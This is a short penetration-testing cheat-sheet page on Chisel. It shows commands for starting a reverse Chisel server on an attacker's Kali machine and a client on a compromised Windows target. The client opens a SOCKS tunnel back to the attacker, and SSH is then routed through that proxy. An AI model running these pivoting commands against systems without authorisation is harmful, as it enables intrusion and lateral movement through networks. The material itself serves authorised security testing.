---
layout: default
title: Chisel
parent: Network
nav_order: 1
permalink: /network/chisel/
---

# Chisel
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

Server and client can be both started with [Chisel](https://github.com/jpillora/chisel).

```bash
# Start chisel server on your Kali.
chisel server --port $lport --reverse

# Start chisel client on a Windows target.
chisel.exe client $lhost:$lport R:socks

# Modify /etc/proxychains4.conf.
socks5 127.0.0.1 1080

# Create a proxyfied ssh tunnel through the chisel client to your target.
ssh -o ProxyCommand="ncat --proxy-type socks5 --proxy 127.0.0.1:$socks_port %h %p" $username@$target
```

{: .important }
> If you want to perform port scanning through port tunneling, you should consider using [Naabu](/network/scanning/#naabu).